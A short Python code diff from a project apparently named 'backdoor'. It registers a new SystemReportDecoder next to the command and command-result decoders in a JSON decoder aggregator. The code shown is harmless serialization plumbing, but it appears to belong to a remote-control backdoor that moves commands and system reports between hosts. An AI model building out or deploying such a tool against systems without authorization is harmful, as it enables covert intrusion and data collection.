@@ -7,11 +7,16 @@ from backdoor.serialization.decoders.commands import (
 )
 from backdoor.serialization.decoders.decoder import Decoder
 from backdoor.serialization.decoders.exceptions import NotDecodableError
+from backdoor.serialization.decoders.systmereport import SystemReportDecoder
 
 
 class DecoderAggregator(JSONDecoder):
 
-    decoders: Sequence[Decoder] = (CommandDecoder(), CommandResultDecoder())
+    decoders: Sequence[Decoder] = (
+        CommandDecoder(),
+        CommandResultDecoder(),
+        SystemReportDecoder(),
+    )
 
     def __init__(self, *args: Any, **kwargs: Any) -> None:
         super().__init__(object_hook=self.command_hook, *args, **kwargs)
